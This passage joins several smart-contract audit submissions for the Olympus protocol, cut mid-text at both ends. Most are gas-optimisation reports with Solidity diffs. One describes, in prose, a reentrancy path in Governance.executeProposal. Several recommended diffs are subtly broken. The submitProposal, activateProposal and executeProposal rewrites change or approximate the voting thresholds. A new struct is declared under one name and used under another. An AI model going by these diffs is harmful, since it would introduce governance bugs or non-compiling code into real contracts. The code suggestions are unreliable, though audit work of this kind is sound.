Keycode[](2); -       dependencies[0] = toKeycode("TRSRY"); -       dependencies[1] = toKeycode("MINTR"); +       dependencies[0] = dep0; +       dependencies[1] = dep1;  -       TRSRY = OlympusTreasury(getModuleAddress(dependencies[0])); -       MINTR = OlympusMinter(getModuleAddress(dependencies[1])); +       TRSRY = OlympusTreasury(getModuleAddress(dep0)); +       MINTR = OlympusMinter(getModuleAddress(dep1));          // Approve MINTR for burning OHM (called here so that it is re-approved on updates)         ohm.safeApprove(address(MINTR), type(uint256).max);     } ```  **Affected source code:**  - [BondCallback.sol:50-51](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L50-L51)  ### Optimize `Governance.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("INSTR"); +   KeyCode private immutable dep1 = toKeycode("VOTES");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](2); -       dependencies[0] = toKeycode("INSTR"); -       dependencies[1] = toKeycode("VOTES"); +       dependencies[0] = dep0; +       dependencies[1] = dep1;  -       INSTR = OlympusInstructions(getModuleAddress(dependencies[0])); -       VOTES = OlympusVotes(getModuleAddress(dependencies[1])); +       INSTR = OlympusInstructions(getModuleAddress(dep0)); +       VOTES = OlympusVotes(getModuleAddress(dep1));     } ```  **Affected source code:**  - [Governance.sol:61-68](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L61-L68)  ### Optimize `Operator.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("PRICE"); +   KeyCode private immutable dep1 = toKeycode("RANGE"); +   KeyCode private immutable dep2 = toKeycode("TRSRY"); +   KeyCode private immutable dep3 = toKeycode("MINTR");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](4); -       dependencies[0] = toKeycode("PRICE"); -       dependencies[1] = toKeycode("RANGE"); -       dependencies[2] = toKeycode("TRSRY"); -       dependencies[3] = toKeycode("MINTR"); +       dependencies[0] = dep0; +       dependencies[1] = dep1; +       dependencies[2] = dep2; +       dependencies[3] = dep3;  -       PRICE = OlympusPrice(getModuleAddress(dependencies[0])); -       RANGE = OlympusRange(getModuleAddress(dependencies[1])); -       TRSRY = OlympusTreasury(getModuleAddress(dependencies[2])); -       MINTR = OlympusMinter(getModuleAddress(dependencies[3])); +       PRICE = OlympusPrice(getModuleAddress(dep0)); +       RANGE = OlympusRange(getModuleAddress(dep1)); +       TRSRY = OlympusTreasury(getModuleAddress(dep2)); +       MINTR = OlympusMinter(getModuleAddress(dep3));          /// Approve MINTR for burning OHM (called here so that it is re-approved on updates)         ohm.safeApprove(address(MINTR), type(uint256).max);     } ```  **Affected source code:**  - [Operator.sol:154-168](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L154-L168)  ## **11. Avoid storage use**  It is possible to avoid storage accesses by taking advantage of memory variables that have the same value, as shown below.  **Recommended changes:**  ```diff     constructor(         Kernel kernel_,         AggregatorV2V3Interface ohmEthPriceFeed_,         AggregatorV2V3Interface reserveEthPriceFeed_,         uint48 observationFrequency_,         uint48 movingAverageDuration_     ) Module(kernel_) {         /// @dev Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations         if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency_ != 0)             revert Price_InvalidParams();          // Set price feeds, decimals, and scale factor         _ohmEthPriceFeed = ohmEthPriceFeed_; -       uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); +       uint8 ohmEthDecimals = ohmEthPriceFeed_.decimals();          _reserveEthPriceFeed = reserveEthPriceFeed_; -       uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); +       uint8 reserveEthDecimals = reserveEthPriceFeed_.decimals(); ```  **Affected source code:**  - [PRICE.sol:84](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L84) - [PRICE.sol:87](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L87)  ## **12. Use `inline` instead of a method**  The following methods can be moved to inline calls without greatly affecting readability, this will increase the performance of the contract.  **Recommended changes:**  ```diff     function beat() external nonReentrant {         ...          // Issue reward to sender -       _issueReward(msg.sender); +       rewardToken.safeTransfer(msg.sender, reward); +       emit RewardIssued(msg.sender, reward);         emit Beat(block.timestamp);     }  -   function _issueReward(address to_) internal { -       rewardToken.safeTransfer(to_, reward); -       emit RewardIssued(to_, reward); -   } ```  **Affected source code:**  - [Heart.sol:111-114](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L111-L114)  ## **13. Gas saving using `immutable`**  It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:  It's also better to remove the initial values, because they will be set during the constructor.  **Affected source code:**  - [BondCallback.sol:28](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L28) - [BondCallback.sol:32](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L32)  ## **14. Avoid public constants**  The number of public methods increase the bytecode of the contract, in addition to the possible attack vectors, reducing the number to the minimum necessary for the contract to work normally is a good practice for both security and gas savings.  It can be more efficient to change constants that shouldn't be made `public` to private or `internal` to stay away from pointless getter functions.  **Affected source code:**  - [Operator.sol:89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89) - [PRICE.sol:59](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L59) - [RANGE.sol:65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65) - [RANGE.sol:65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65) - [Governance.sol:121](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L121) - [Governance.sol:124](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L124) - [Governance.sol:127](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L127) - [Governance.sol:130](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L130) - [Governance.sol:133](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L133) - [Governance.sol:137](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L137)  ## **15. Reduce math operations** ### Optimize `Governance.submitProposal`  It is possible to reduce the condition of the `submitProposal` method in the following way, since it is not necessary to multiply in both places.  ```diff function submitProposal(         Instruction[] calldata instructions_,         bytes32 title_,         string memory proposalURI_     ) external { -       if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT) +       if (VOTES.balanceOf(msg.sender) * SUBMISSION_REQUIREMENT < VOTES.totalSupply())             revert NotEnoughVotesToPropose(); ```  **Affected source code:**  - [Governance.sol:164](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164)  ### Optimize `Governance.activateProposal`  ```diff     function activateProposal(uint256 proposalId_) external {         ...         if ( -           (totalEndorsementsForProposal[proposalId_] * 100) < -           VOTES.totalSupply() * ENDORSEMENT_THRESHOLD +           (totalEndorsementsForProposal[proposalId_] * 50) < +           VOTES.totalSupply()         ) {             revert NotEnoughEndorsementsToActivateProposal();         }         ...     } ```  **Affected source code:**  - [Governance.sol:217-218](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L217-L218)  ### Optimize `Governance.executeProposal`   ```diff -       if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) { +       if (netVotes * 3 < VOTES.totalSupply()) {             revert NotEnoughVotesToExecute();         } ```  **Affected source code:**  - [Governance.sol:268](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268)  ### Optimize `Operator._activate`  It's possible to avoid the duplicate operation of `10**(oracleDecimals * 2)` like following:  ```diff -           uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; -           uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; +           uint256 invCushionPrice = 10**(oracleDecimals * 2); +           uint256 invWallPrice = invCushionPrice / range.wall.low.price; +           invCushionPrice /= range.cushion.low.price; ```  **Affected source code:**  - [Operator.sol:419-420](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L419-L420)  ## **16. Use `calldata` instead of `memory`**  The method `propose` is `external`, and the arguments are defined as `memory` instead of as `calldata`.  By marking the function as `external` it is possible to use `calldata` in the arguments shown below and save significant gas.  **Recommended change:**  ```diff     function submitProposal(         Instruction[] calldata instructions_,         bytes32 title_, -       string memory proposalURI_ +       string calldata proposalURI_     ) external {    ...    } ```  **Affected source code:**  - [Governance.sol:162](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L162)  ## **17. Optimze instructions order**  It is recommended to always perform input or parameter checks first, from cheapest to most expensive. Avoiding making external calls or unnecessary costly tasks for the cases to be verified.  ### Optimize `Governance.endorseProposal` **Recommended change:**  ```diff     function endorseProposal(uint256 proposalId_) external { -       uint256 userVotes = VOTES.balanceOf(msg.sender);          if (proposalId_ == 0) {             revert CannotEndorseNullProposal();         }          Instruction[] memory instructions = INSTR.getInstructions(proposalId_);         if (instructions.length == 0) {             revert CannotEndorseInvalidProposal();         }          // undo any previous endorsement the user made on these instructions         uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];         totalEndorsementsForProposal[proposalId_] -= previousEndorsement;          // reapply user endorsements with most up-to-date votes +       uint256 userVotes = VOTES.balanceOf(msg.sender);         userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;         totalEndorsementsForProposal[proposalId_] += userVotes;          emit ProposalEndorsed(proposalId_, msg.sender, userVotes);     } ```  **Affected source code:**  - [Governance.sol:181](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L181)  ### Optimize `Governance.endorseProposal` **Recommended change:**  ```diff     function vote(bool for_) external { -       uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }  +       uint256 userVotes = VOTES.balanceOf(msg.sender);         if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  **Affected source code:**  - [Governance.sol:241](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L241)  ## **18. Optimze `Governance` storage**  It is possible to save all duplicate keys between `yesVotesForProposal` and `noVotesForProposal` if they both share the same key and use a structure as a value.  **Recommended change:**  ```diff + struct ActivatedProposal { +     uint256 yes; +     uint256 no; + }  +   /// @notice Return the total of votes for a proposal id used in calculating net votes. +   mapping(uint256 => YesNo) public votesForProposal; -   /// @notice Return the total yes votes for a proposal id used in calculating net votes. -   mapping(uint256 => uint256) public yesVotesForProposal;  -   /// @notice Return the total no votes for a proposal id used in calculating net votes. -   mapping(uint256 => uint256) public noVotesForProposal; ```  **Affected source code:**  - [Governance.sol:111](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L111)  ## **19. `delete` optimization**  Use `delete` instead of set to default value (`false` or `0`).  5 gas could be saved per entry in the following affected lines:  **Affected source code:**  - [Kernel.sol:455](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L455)  ### Total gas saved: **5 * 1 = 5**  ## **20. Optimize `Operator.bondPurchase`**  It's possible to optimize the following method using an `else` instruction:   ```diff     function bondPurchase(uint256 id_, uint256 amountOut_)         external         onlyWhileActive         onlyRole("operator_reporter")     {         if (id_ == RANGE.market(true)) {             _updateCapacity(true, amountOut_);             _checkCushion(true);         } +       else if (id_ == RANGE.market(false)) { -       if (id_ == RANGE.market(false)) {             _updateCapacity(false, amountOut_);             _checkCushion(false);         }     } ```  **Affected source code:**  - [Operator.sol:346-359](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346-L359)  ## **21. Optimize `Operator` refactoring some methods**  It is possible to remove the `bool high_` argument and the required conditionals in the following methods. It's best to create two methods, one for high and one for low to reduce push arguments and conditional checking, because all the logic is different.  **Affected source code:**  - `_activate` in [Operator.sol:363](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363) - `_regenerate` in [Operator.sol:699](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L699)  ## **22. Optimize `Operator.setRegenParams` and `Operator._regenerate`**  It is possible to avoid repeated accesses to storage as well as possible human errors such as those posted in the issues about the `lastRegen` field if instead of manually resetting each field in the struct, the entire struct is reset. This will save a considerable amount of gas and reduce human error.  ```diff     function setRegenParams(         uint32 wait_,         uint32 threshold_,         uint32 observe_     ) external onlyRole("operator_policy") {         /// Confirm regen parameters are within allowed values         if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)             revert Operator_InvalidParams();          /// Set regen params         _config.regenWait = wait_;         _config.regenThreshold = threshold_;         _config.regenObserve = observe_;  -       /// Re-initialize regen structs with new values (except for last regen) +       /// Re-initialize regen structs with new values +       Regen memory empty = Regen({ +           count: uint32(0), +           lastRegen: uint48(block.timestamp), +           nextObservation: uint32(0), +           observations: new bool[](observe_) +       }); +       _status.high = empty; -       _status.high.count = 0; -       _status.high.nextObservation = 0; -       _status.high.observations = new bool[](observe_);  +       _status.low = empty; -       _status.low.count = 0; -       _status.low.nextObservation = 0; -       _status.low.observations = new bool[](observe_);          emit RegenParamsChanged(wait_, threshold_, observe_);     }          ...      function _regenerate(bool high_) internal {         /// Deactivate cushion if active on the side being regenerated         _deactivate(high_);  +       Regen memory empty = Regen({ +           count: uint32(0), +           lastRegen: uint48(block.timestamp), +           nextObservation: uint32(0), +           observations: new bool[](_config.regenObserve) +       });          if (high_) {              /// Reset the regeneration data for the side +           _status.high = empty; -           _status.high.count = uint32(0); -           _status.high.observations = new bool[](_config.regenObserve); -           _status.high.nextObservation = uint32(0); -           _status.high.lastRegen = uint48(block.timestamp);              /// Calculate capacity             uint256 capacity = fullCapacity(true);              /// Regenerate the side with the capacity             RANGE.regenerate(true, capacity);         } else {             /// Reset the regeneration data for the side +           _status.low = empty; -           _status.low.count = uint32(0); -           _status.low.observations = new bool[](_config.regenObserve); -           _status.low.nextObservation = uint32(0); -           _status.low.lastRegen = uint48(block.timestamp);              /// Calculate capacity             uint256 capacity = fullCapacity(false);              /// Regenerate the side with the capacity             RANGE.regenerate(false, capacity);         }     } ```  **Affected source code:**  - [Operator.sol:574-580](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L574-L580) - [Operator.sol:705-720](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L705-L720) 
  # Gas Optimizations  ## Summary Of Findings:    | Issue  -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function 2 | Simplify formulas and emit local variables in `updatePrices` function 3 | Caching storage variable in the `callback` function 4 | Caching storage variable in the `vote` function 5 | Caching storage variable in the `executeProposal` function  ## Detailed Report on Gas Optimization Findings:  ### 1. <ins>Caching storage variable and using `unchecked` in `updateMovingAverage()` function</ins> The [updateMovingAverage()](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122-L147) function in `PRICE.sol` can save gas by the following changes:   1. Cache the state variable `nextObsIndex`. Storage reads are much more expensive than memory reads (100 Vs 3).  2. Use uncheck block for the line `nextObsIndex = (nextObsIndex + 1) % numObs;`  As `numObs` is greater than zero from the previous calculation in the if-else block. And `nextObsIndex` can be safely assumed to be never equal to `type(uint32).max`.    The following `diff` shows the mitigation: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 7b37684..ca3cab4 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -6,8 +6,8 @@          uint32 numObs = numObservations;            // Get earliest observation in window -        uint256 earliestPrice = observations[nextObsIndex]; - +        uint32 cachednextObsIndex = nextObsIndex; +        uint256 earliestPrice = observations[cachednextObsIndex];           uint256 currentPrice = getCurrentPrice();            // Calculate new moving average @@ -18,9 +18,11 @@          }            // Push new observation into storage and store timestamp taken at -        observations[nextObsIndex] = currentPrice; +        observations[cachednextObsIndex] = currentPrice;          lastObservationTime = uint48(block.timestamp); -        nextObsIndex = (nextObsIndex + 1) % numObs; +        unchecked { +            nextObsIndex = (cachednextObsIndex + 1) % numObs;   +        }            emit NewObservation(block.timestamp, currentPrice, _movingAverage);      } ```  We convert 3 storage reads to 1 storage read and 2 memory reads. Along with the unchecked operation this will save us around 250 gas.  ### 2. <ins>Simplify formulas and emit local variables in `updatePrices` function</ins>  The [updatePrices](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L158-L178) function in `RANGE.sol` can save gas by the following changes:   1. There are four equations which follow the same kind of pattern. For example: ```solidity movingAverage_ * (FACTOR_SCALE - wallSpread) / FACTOR_SCALE ``` This could be simplified as: ```solidity // expanding the equation         movingAverage_ * FACTOR_SCALE / FACTOR_SCALE - movingAverage_ * wallSpread / FACTOR_SCALE // which is simplified into:         movingAverage_ - movingAverage_ * wallSpread / FACTOR_SCALE //the right hand side of the above equation is used twice so we can calculate it and save it in a memory variable. Like this:         uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE;         _range.wall.low.price = movingAverage_ - temp1;         _range.wall.high.price = movingAverage_ + temp1; ```  2. The emit at the end of the function uses the above storage variables. But we can save gas by just doing the calculations directly:   Finally the mitigation diff with the above changes looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 57c28a0..78909cc 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -2,20 +2,20 @@          // Cache the spreads          uint256 wallSpread = _range.wall.spread;          uint256 cushionSpread = _range.cushion.spread; -          // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE; + +        _range.wall.low.price = movingAverage_ - temp1; +        _range.wall.high.price = movingAverage_ + temp1;   -        _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = -            (movingAverage_ * (FACTOR_SCALE + cushionSpread)) / -            FACTOR_SCALE; +        uint256 temp2 = movingAverage_ * cushionSpread / FACTOR_SCALE; +        _range.cushion.low.price = movingAverage_ - temp2; +        _range.cushion.high.price = movingAverage_ + temp2;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +             movingAverage_ - temp1, +             movingAverage_ - temp2, +             movingAverage_ + temp2, +             movingAverage_ + temp1          );      }  ``` The above optimization reduced the average gas consumption of `updatePrices` function from 40966 to 40605, which means a gas saving of **361**. This function is used by the [initialize](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L598), [operate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195)  and [setSpreads](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L498) functions in `Operator` contract as well. Which means effectively we save 3 times 361 = 1083 gas.   ### 3. <ins>Caching storage variable in the `callback` function</ins> The [callback](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L100) function in the `BondCallback` contract reads the storage variable `ohm` multiple times. `ohm` could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index beb85a5..e559dc5 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,4 +1,4 @@ -    function callback( +  function callback(          uint256 id_,          uint256 inputAmount_,          uint256 outputAmount_ @@ -14,22 +14,22 @@          // Check that quoteTokens were transferred prior to the call          if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)              revert Callback_TokensNotReceived(); - +        ERC20 cachedOHM = ohm;              // Handle payout -        if (quoteToken == payoutToken && quoteToken == ohm) { +        if (quoteToken == payoutToken && quoteToken == cachedOHM) {               // If OHM-OHM bond, only mint the difference and transfer back to teller              uint256 toMint = outputAmount_ - inputAmount_;              MINTR.mintOhm(address(this), toMint);                // Transfer payoutTokens to sender              payoutToken.safeTransfer(msg.sender, outputAmount_); -        } else if (quoteToken == ohm) { +        } else if (quoteToken == cachedOHM) {              // If inverse bond (buying ohm), transfer payout tokens to sender              TRSRY.withdrawReserves(msg.sender, payoutToken, outputAmount_);                // Burn OHM received from sender              MINTR.burnOhm(address(this), inputAmount_); -        } else if (payoutToken == ohm) { +        } else if (payoutToken == cachedOHM) {              // Else (selling ohm), mint OHM to sender              MINTR.mintOhm(msg.sender, outputAmount_);          } else {  ```   The mitigation reduced the max gas consumption of `callback` function from 187927 to 187847, which means a saving of 80 gas.  ### 4. <ins>Caching storage variable in the `vote` function</ins> The [vote](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 6656cb4..2d24d2e 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,23 +1,23 @@      function vote(bool for_) external {          uint256 userVotes = VOTES.balanceOf(msg.sender); - -        if (activeProposal.proposalId == 0) { +        uint256 cachedID = activeProposal.proposalId; +        if (cachedID == 0) {  // @audit cache it.              revert NoActiveProposalDetected();          }   -        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { +        if (userVotesForProposal[cachedID][msg.sender] > 0) {              revert UserAlreadyVoted();          }            if (for_) { -            yesVotesForProposal[activeProposal.proposalId] += userVotes; +            yesVotesForProposal[cachedID] += userVotes;          } else { -            noVotesForProposal[activeProposal.proposalId] += userVotes; +            noVotesForProposal[cachedID] += userVotes;          }   -        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; +        userVotesForProposal[cachedID][msg.sender] = userVotes;            VOTES.transferFrom(msg.sender, address(this), userVotes);   -        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes); +        emit WalletVoted(cachedID, msg.sender, for_, userVotes);      } ```   The mitigation reduces the max storage reads from 5 to 1. Which can save up to 400 gas.  ### 5. <ins>Caching storage variable in the `executeProposal` function</ins> The [executeProposal](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads. Plus the length of the array could be cached to save gas in the `for` loop.   The mitigation `diff` looks like this: ```diff diff --git "a/.\\orig.txt" "b/.\\modified.txt" index 733a8a2..41ff620 100644 --- "a/.\\orig.txt" +++ "b/.\\modified.txt" @@ -1,6 +1,7 @@      function executeProposal() external { -        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - -            noVotesForProposal[activeProposal.proposalId]; +        uint256 cachedID = activeProposal.proposalId; +        uint256 netVotes = yesVotesForProposal[cachedID] -   +            noVotesForProposal[cachedID];          if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {              revert NotEnoughVotesToExecute();          } @@ -9,16 +10,16 @@              revert ExecutionTimelockStillActive();          }   -        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId); - -        for (uint256 step; step < instructions.length; ) { -            kernel.executeAction(instructions[step].action, instructions[step].target); +        Instruction[] memory instructions = INSTR.getInstructions(cachedID); +        uint256 len = instructions.length; +        for (uint256 step; step < len; ) {   +            kernel.executeAction(instructions[step].action, instructions[step].target);               unchecked {                  ++step;              }          }   -        emit ProposalExecuted(activeProposal.proposalId); +        emit ProposalExecuted(cachedID);            // deactivate the active proposal          activeProposal = ActivatedProposal(0, 0); ```   The mitigation reduces the max storage reads from 4 to 1. Which can save up to 300 gas.  ## Conclusions:    | Issue | Gas Saved -- | -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function | 250 2 | Simplify formulas and emit local variables in `updatePrices` function | 1083  3 | Caching storage variable in the `callback` function | 80 4 | Caching storage variable in the `vote` function | 400 5 | Caching storage variable in the `executeProposal` function | 300  ### TOTAL GAS SAVED = 250 + 1083 + 80 + 400 + 300 = <ins>2113</ins>. 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288   # Vulnerability details  ## Impact Given that the activeProposal change is done before the for loop, if this function is call through one kernel.executeAction(instruction,target) we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).  ## Proof of Concept For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:  1. Call executeAction 1. This allow us to call kernel.executeAction in the for loop 1. executAction allow us to call **_installModule** 1. **\_installModule** allow us to call **newModule_.Init** 1. By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),  ## Tools Used Static Analysis  ## Recommended Mitigation Steps Use nonReentrant modifier or move the line ```activeProposal = ActivatedProposal(0, 0);``` before the for loop. 
https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol 1. unchecked : activePolicies.lenght-1 cannot underflow since element is pushed in previous statement  ``` git diff diff --git a/src/Kernel.sol b/src/Kernel.sol index 3a00ec5..c9a3536 100644 --- a/src/Kernel.sol +++ b/src/Kernel.sol @@ -297,7 +297,10 @@ contract Kernel {            // Add policy to list of active policies          activePolicies.push(policy_); -        getPolicyIndex[policy_] = activePolicies.length - 1; +        //activePolicies.lenght-1 cannot underflow since element is pushed in previous statement +        unchecked { +            getPolicyIndex[policy_] = activePolicies.length - 1; +        }            // Record module dependencies          Keycode[] memory dependencies = policy_.configureDependencies(); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol 1. unchecked : totalInstructions cannot practically reach uint max  ``` git diff diff --git a/src/modules/INSTR.sol b/src/modules/INSTR.sol index 4536df2..56825ae 100644 --- a/src/modules/INSTR.sol +++ b/src/modules/INSTR.sol @@ -41,7 +41,10 @@ contract OlympusInstructions is Module {      /// @notice Store a list of Instructions to be executed in the future.      function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {          uint256 length = instructions_.length; -        uint256 instructionsId = ++totalInstructions; +        uint256 instructionsId; +        unchecked { +            instructionsId = ++totalInstructions; +        }            Instruction[] storage instructions = storedInstructions[instructionsId]; ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol 1.  Use local variables to refer storage variables  ``` git diff diff --git a/src/modules/RANGE.sol b/src/modules/RANGE.sol index e878bac..5ff2cef 100644 --- a/src/modules/RANGE.sol +++ b/src/modules/RANGE.sol @@ -161,19 +161,20 @@ contract OlympusRange is Module {          uint256 cushionSpread = _range.cushion.spread;            // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        //Use local variables to refer storage variables +        uint256 _r_wall_low_price = _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; +        uint256 _r_wall_high_price = _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;   -        _range.cushion.low.price = (movingAverage_ * 